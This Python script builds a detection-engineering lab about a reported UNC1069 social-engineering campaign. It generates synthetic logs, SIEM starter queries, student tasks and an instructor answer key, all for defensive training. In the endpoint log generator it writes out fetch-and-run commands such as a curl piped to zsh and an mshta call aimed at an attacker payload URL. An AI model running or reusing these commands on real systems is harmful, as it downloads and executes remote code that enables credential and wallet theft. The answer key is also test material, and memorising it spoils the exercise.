#!/usr/bin/env python3
from __future__ import annotations

import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
LAB = "unc1069-crypto-ai-social-engineering-20260430-2046"
OUT = ROOT / "labs" / LAB
DATA = OUT / "data"
START = datetime(2026, 2, 9, 14, 0, tzinfo=timezone.utc)
random.seed(1069)

DOMAIN_FAKE_ZOOM = "zoom.uswe05.us"
DOMAIN_PAYLOAD = "mylingocoin.com"
URL_PAYLOAD = "http://mylingocoin.com/audio/fix/6454694440"
PAYLOAD_ID = "6454694440"
MALWARE = ["WAVESHAPER", "SUGARLOADER", "HYPERCALL", "HIDDENCALL", "SILENCELIFT", "DEEPBREATH", "CHROMEPUSH"]
USERS = ["alice", "marco", "renee", "devon", "sam", "lee", "priya", "nina", "crypto-analyst", "wallet-admin"]
HOSTS = ["fintech-mac-01", "crypto-dev-mac-02", "wallet-win-03", "defi-eng-win-04", "vc-mac-05", "trading-win-06", "research-mac-07", "ops-win-08"]
BENIGN_DOMAINS = ["calendly.com", "zoom.us", "telegram.org", "github.com", "google.com", "slack.com", "coinbase.com", "cloudflare-dns.com"]
BENIGN_IPS = ["142.250.72.14", "104.16.132.229", "140.82.114.4", "34.117.59.81", "13.107.246.45"]
BAD_IPS = ["45.77.88.106", "104.248.106.9", "185.199.106.9"]


def ts(i: int, offset: int = 0) -> str:
    return (START + timedelta(minutes=i, seconds=(i * 17 + offset) % 60)).isoformat().replace("+00:00", "Z")


def user_host(i: int) -> tuple[str, str]:
    return USERS[i % len(USERS)], HOSTS[i % len(HOSTS)]


def suspicious(i: int) -> bool:
    return i in {7, 8, 9, 10, 21, 22, 23, 39, 40, 41, 58, 59, 73, 74, 88, 89, 96}


def write_jsonl(path: Path, events: list[dict]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", encoding="utf-8") as f:
        for event in events:
            f.write(json.dumps(event, separators=(",", ":")) + "\n")


def social_events() -> list[dict]:
    events = []
    for i in range(100):
        bad = suspicious(i)
        user, host = user_host(i)
        channel = "telegram" if bad or i % 3 else random.choice(["slack", "email", "calendar"])
        action = "fake_zoom_lure" if bad else random.choice(["message_received", "meeting_scheduled", "link_clicked"])
        e = {
            "@timestamp": ts(i),
            "event.dataset": "social",
            "event.category": "social_engineering",
            "event.action": action,
            "event_type": action,
            "user.name": user,
            "host.name": host,
            "communication.channel": channel,
            "sender.account": "compromised-crypto-exec" if bad else random.choice(["coworker", "vendor", "calendar-bot"]),
            "url.full": f"https://{DOMAIN_FAKE_ZOOM}/join/{PAYLOAD_ID}" if bad else f"https://{random.choice(BENIGN_DOMAINS)}/meeting/{i}",
            "domain": DOMAIN_FAKE_ZOOM if bad else random.choice(BENIGN_DOMAINS),
            "threat.actor": "UNC1069" if bad else "",
            "severity": "high" if bad else "info",
            "message": "Telegram lure to fake Zoom meeting after rapport-building" if bad else "Routine collaboration event",
        }
        events.append(e)
    return events


def dns_events() -> list[dict]:
    events = []
    for i in range(100):
        bad = suspicious(i)
        user, host = user_host(i + 1)
        domain = DOMAIN_PAYLOAD if bad and i % 2 else (DOMAIN_FAKE_ZOOM if bad else random.choice(BENIGN_DOMAINS))
        ip = random.choice(BAD_IPS) if bad else random.choice(BENIGN_IPS)
        action = "dns_query"
        events.append({
            "@timestamp": ts(i, 3),
            "event.dataset": "dns",
            "event.category": "network",
            "event.action": action,
            "event_type": action,
            "host.name": host,
            "user.name": user,
            "domain": domain,
            "dns.question.name": domain,
            "destination.ip": ip,
            "dns.answers": [ip],
            "threat.actor": "UNC1069" if bad else "",
            "severity": "medium" if bad else "info",
            "message": f"DNS query for {domain}",
        })
    return events


def web_events() -> list[dict]:
    events = []
    for i in range(100):
        bad = suspicious(i)
        user, host = user_host(i + 2)
        url = URL_PAYLOAD if bad else f"https://{random.choice(BENIGN_DOMAINS)}/resource/{i}"
        action = "clickfix_payload_download" if bad else "http_request"
        events.append({
            "@timestamp": ts(i, 6),
            "event.dataset": "proxy",
            "event.category": "network",
            "event.action": action,
            "event_type": action,
            "host.name": host,
            "user.name": user,
            "url.full": url,
            "domain": DOMAIN_PAYLOAD if bad else random.choice(BENIGN_DOMAINS),
            "destination.ip": random.choice(BAD_IPS) if bad else random.choice(BENIGN_IPS),
            "http.request.method": "GET",
            "http.response.status_code": 200 if bad else random.choice([200, 204, 302]),
            "user_agent.original": "audio" if bad else random.choice(["Mozilla/5.0", "curl/8.1.2", "Zoom/6.0"]),
            "threat.actor": "UNC1069" if bad else "",
            "severity": "high" if bad else "info",
            "message": "ClickFix troubleshooting command fetched payload" if bad else "Routine web request",
        })
    return events


def endpoint_events() -> list[dict]:
    events = []
    mac_commands = [
        "system_profiler SPAudioData",
        "softwareupdate --evaluate-products --products audio --agree-to-license",
        f"curl -A audio -s {URL_PAYLOAD} | zsh",
        "system_profiler SPSoundCardData",
    ]
    win_commands = [
        "setx audio_volume 100",
        "pnputil /enum-devices /connected /class Audio",
        f"mshta {URL_PAYLOAD}",
        "wmic sounddev get Caption, ProductName, DeviceID, Status",
    ]
    for i in range(100):
        bad = suspicious(i)
        user, host = user_host(i + 3)
        is_mac = "mac" in host
        command = (mac_commands if is_mac else win_commands)[i % 4] if bad else random.choice(["zoom --join meeting", "python build.py", "node server.js", "chrome --type=renderer"])
        proc = "zsh" if bad and is_mac else ("mshta.exe" if bad else random.choice(["chrome.exe", "python", "node", "zoom"]))
        action = "clickfix_command_execution" if bad else "process_start"
        events.append({
            "@timestamp": ts(i, 9),
            "event.dataset": "endpoint",
            "event.category": "process",
            "event.action": action,
            "event_type": action,
            "host.name": host,
            "user.name": user,
            "process.name": proc,
            "process.command_line": command,
            "url.full": URL_PAYLOAD if bad else "",
            "domain": DOMAIN_PAYLOAD if bad else "",
            "destination.ip": random.choice(BAD_IPS) if bad else "",
            "threat.actor": "UNC1069" if bad else "",
            "severity": "critical" if bad else "info",
            "message": "User executed ClickFix troubleshooting command" if bad else "Routine process activity",
        })
    return events


def malware_events() -> list[dict]:
    events = []
    for i in range(100):
        bad = suspicious(i)
        user, host = user_host(i + 4)
        family = MALWARE[i % len(MALWARE)] if bad else random.choice(["benign_updater", "edr_agent", "browser_helper"])
        action = "malware_execution" if bad else "file_scan"
        steal_targets = ["browser_cookies", "session_tokens", "telegram_data", "wallet_keys", "host_profile"]
        events.append({
            "@timestamp": ts(i, 12),
            "event.dataset": "malware",
            "event.category": "malware",
            "event.action": action,
            "event_type": action,
            "host.name": host,
            "user.name": user,
            "malware.family": family,
            "file.name": f"{family.lower()}" if bad else "updater.bin",
            "file.path": f"/Users/{user}/Library/Application Support/{family.lower()}" if bad and "mac" in host else (f"C:\\ProgramData\\{family.lower()}\\loader.exe" if bad else ""),
            "credential.target": random.choice(steal_targets) if bad else "",
            "domain": DOMAIN_PAYLOAD if bad else "",
            "destination.ip": random.choice(BAD_IPS) if bad else "",
            "threat.actor": "UNC1069" if bad else "",
            "severity": "critical" if bad else "info",
            "message": f"{family} observed harvesting host or browser data" if bad else "Routine security scan event",
        })
    return events


def write_lab_docs() -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    (OUT / "README.md").write_text(f"""# de-lab-{LAB}

Detection engineering lab based on the Google Cloud/Mandiant article: **UNC1069 Targets Cryptocurrency Sector with New Tooling and AI-Enabled Social Engineering**.

Timestamped class name: `{LAB}`

## Scenario

UNC1069 targets a cryptocurrency/DeFi organization through a compromised Telegram account, fake Zoom meeting, AI-enabled social engineering, and a ClickFix-style troubleshooting ruse. The victim executes macOS or Windows commands that fetch payloads from attacker infrastructure, followed by deployment of multiple malware families used to capture host data, browser data, credentials, and session tokens.

## Known indicators and behaviors

- Threat actor: `UNC1069`
- Fake Zoom domain: `{DOMAIN_FAKE_ZOOM}`
- Payload domain: `{DOMAIN_PAYLOAD}`
- Payload URL: `{URL_PAYLOAD}`
- Payload ID: `{PAYLOAD_ID}`
- Malware/tooling: `{', '.join(MALWARE)}`
- Behaviors: Telegram lure, fake Zoom, ClickFix command execution, payload download, credential/session-token collection

## Learning objectives

- Build detections for AI-enabled social engineering and fake meeting lures
- Detect ClickFix command execution on macOS and Windows
- Correlate DNS/proxy/endpoint/malware telemetry into a single intrusion timeline
- Compare high-signal IOC matching with behavior-based detection logic
- Practice writing an analyst report that separates confirmed telemetry from reported social-engineering claims

## Structure

- `data/` source-separated synthetic logs
- `exercise/` student workflow
- `splunk/` SPL starter searches
- `elastic/esql/` ES|QL starter searches
- `kibana/` Discover/rule checklist
- `instructor/` answer key and detection notes
""", encoding="utf-8")

    (OUT / "exercise").mkdir(exist_ok=True)
    (OUT / "exercise" / "README.md").write_text(f"""# Student exercise

## Task 1: Identify the lure
Search for Telegram/social events that point users to fake meeting infrastructure.

Suggested searches:

- `{DOMAIN_FAKE_ZOOM}`
- `fake_zoom_lure`
- `UNC1069`

## Task 2: Find the ClickFix execution
Identify hosts that executed troubleshooting commands that fetched attacker payloads.

Suggested searches:

- `{URL_PAYLOAD}`
- `clickfix_command_execution`
- `mshta`
- `curl -A audio`

## Task 3: Scope malware deployment
Identify malware families deployed after the ClickFix command execution.

Suggested searches:

- `WAVESHAPER`
- `SUGARLOADER`
- `SILENCELIFT`
- `DEEPBREATH`
- `CHROMEPUSH`

## Task 4: Write the detection
Create detections for:

1. Fake meeting / suspicious meeting domain
2. ClickFix command execution
3. Payload URL access
4. Malware family execution or credential-targeting behavior

## Task 5: Analyst summary
Summarize affected users, hosts, indicators, malware families, and recommended containment steps.
""", encoding="utf-8")

    (OUT / "splunk").mkdir(exist_ok=True)
    (OUT / "splunk" / "starter-searches.spl").write_text(f"""index=* (domain={DOMAIN_FAKE_ZOOM} OR domain={DOMAIN_PAYLOAD} OR url.full=\"{URL_PAYLOAD}\")
| table _time event.dataset host.name user.name event_type domain url.full severity message

index=* event_type=clickfix_command_execution
| stats values(process.command_line) as commands values(url.full) as urls by host.name user.name

index=* malware.family IN (WAVESHAPER,SUGARLOADER,HYPERCALL,HIDDENCALL,SILENCELIFT,DEEPBREATH,CHROMEPUSH)
| stats values(malware.family) as malware values(credential.target) as targets by host.name user.name
""", encoding="utf-8")

    (OUT / "elastic" / "esql").mkdir(parents=True, exist_ok=True)
    (OUT / "elastic" / "esql" / "starter-queries.esql").write_text(f"""FROM logs-*
| WHERE domain IN (\"{DOMAIN_FAKE_ZOOM}\", \"{DOMAIN_PAYLOAD}\") OR url.full == \"{URL_PAYLOAD}\"
| KEEP @timestamp, event.dataset, host.name, user.name, event_type, domain, url.full, severity, message
| SORT @timestamp ASC

FROM logs-*
| WHERE event_type == \"clickfix_command_execution\"
| STATS commands = VALUES(process.command_line), urls = VALUES(url.full) BY host.name, user.name

FROM logs-*
| WHERE malware.family IN (\"WAVESHAPER\", \"SUGARLOADER\", \"HYPERCALL\", \"HIDDENCALL\", \"SILENCELIFT\", \"DEEPBREATH\", \"CHROMEPUSH\")
| STATS malware = VALUES(malware.family), targets = VALUES(credential.target) BY host.name, user.name
""", encoding="utf-8")

    (OUT / "kibana").mkdir(exist_ok=True)
    (OUT / "kibana" / "checklist.md").write_text("""# Kibana / Discover checklist

- Create a data view for the imported lab logs.
- Search fake meeting and payload domains.
- Pivot from `user.name` to `host.name`.
- Build a timeline using `@timestamp`, `event.dataset`, `event_type`, and `message`.
- Create at least one rule for ClickFix command execution.
- Create at least one rule for known malware family names.
""", encoding="utf-8")

    (OUT / "instructor").mkdir(exist_ok=True)
    (OUT / "instructor" / "answer-key.md").write_text(f"""# Instructor answer key

## Core story

UNC1069 uses a compromised Telegram account and fake Zoom infrastructure to lure cryptocurrency-sector users. The fake meeting drives a ClickFix troubleshooting flow. The malicious command fetches `{URL_PAYLOAD}` and leads to multi-family malware deployment.

## Must-find indicators

- `{DOMAIN_FAKE_ZOOM}`
- `{DOMAIN_PAYLOAD}`
- `{URL_PAYLOAD}`
- `{PAYLOAD_ID}`
- `UNC1069`
- `{', '.join(MALWARE)}`

## Expected high-signal detections

- Telegram/social event pointing to `{DOMAIN_FAKE_ZOOM}`
- DNS/proxy events for `{DOMAIN_PAYLOAD}`
- Endpoint command line containing `curl -A audio` or `mshta {URL_PAYLOAD}`
- Malware telemetry with listed malware family names
- Credential or session-token target fields populated after ClickFix execution

## Discussion prompts

- Which detections are IOC-only and likely brittle?
- Which detections generalize to future ClickFix campaigns?
- How should analysts document reported AI/deepfake use when endpoint evidence does not prove the video generation method?
""", encoding="utf-8")


def write_data_readme() -> None:
    (DATA / "README.md").write_text(f"""# UNC1069 crypto AI social engineering data pack

Scenario: UNC1069 targets cryptocurrency-sector users with a compromised Telegram account, fake Zoom meeting, ClickFix troubleshooting ruse, and multi-family malware deployment.

Files:

- `social.jsonl` - 100 Telegram/calendar/social-engineering events
- `dns.jsonl` - 100 DNS events
- `proxy.jsonl` - 100 web/proxy events
- `endpoint.jsonl` - 100 endpoint process events
- `malware.jsonl` - 100 malware/credential-targeting events
- `combined.jsonl` - 500 merged events sorted by timestamp

Known IOCs and search terms:

- `UNC1069`
- `{DOMAIN_FAKE_ZOOM}`
- `{DOMAIN_PAYLOAD}`
- `{URL_PAYLOAD}`
- `{PAYLOAD_ID}`
- `clickfix_command_execution`
- `fake_zoom_lure`
- `WAVESHAPER`
- `SUGARLOADER`
- `HYPERCALL`
- `HIDDENCALL`
- `SILENCELIFT`
- `DEEPBREATH`
- `CHROMEPUSH`
""", encoding="utf-8")


def main() -> None:
    datasets = {
        "social.jsonl": social_events(),
        "dns.jsonl": dns_events(),
        "proxy.jsonl": web_events(),
        "endpoint.jsonl": endpoint_events(),
        "malware.jsonl": malware_events(),
    }
    combined = []
    for name, events in datasets.items():
        write_jsonl(DATA / name, events)
        combined.extend(events)
    combined.sort(key=lambda e: e["@timestamp"])
    write_jsonl(DATA / "combined.jsonl", combined)
    write_data_readme()
    write_lab_docs()
    for name, events in datasets.items():
        print(f"{name}: {len(events)}")
    print(f"combined.jsonl: {len(combined)}")


if __name__ == "__main__":
    main()
